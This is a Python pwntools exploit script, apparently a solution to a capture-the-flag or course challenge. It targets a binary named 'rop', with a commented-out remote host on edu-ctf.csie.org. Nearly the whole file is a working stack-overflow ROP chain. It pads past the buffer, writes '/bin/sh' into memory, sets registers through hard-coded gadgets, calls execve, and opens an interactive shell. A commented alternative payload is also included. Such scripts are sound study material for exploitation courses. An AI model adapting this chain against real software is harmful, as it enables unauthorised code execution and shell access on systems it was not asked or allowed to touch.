#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'
#binary = remote('edu-ctf.csie.org', 10173)
binary = process('rop')
pause()
# pause so that gdb can attach to this process

pop_rdi = 0x400686
pop_rsi = 0x4100f3
pop_rdx = 0x449935
mov_rdi = 0x44709b
pop_rax = 0x415714
syscall = 0x40125c
writable_mem = 0x6b6030
pop_rdx_rsi = 0x44beb9

payload = b'a' * (0x30 + 8)
payload += p64(pop_rdi)
payload += p64(writable_mem)
payload += p64(pop_rsi)
payload += b"/bin/sh\0"
payload += p64(mov_rdi)
payload += p64(pop_rdx_rsi)
payload += p64(0)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(syscall)

# shortcut payload
# payload = flat(
#        b'a' * 0x38,
#        pop_rdi,
#        writable_mem,
#        pop_rsi,
#        b"/bin/sh\0",
#        mov_rdi,
#        pop_rsi,
#        0,
#        pop_rdx,
#        0,
#        pop_rax,
#        0x3b,
#        syscall
#    )
binary.sendlineafter(":D", payload)

binary.interactive()
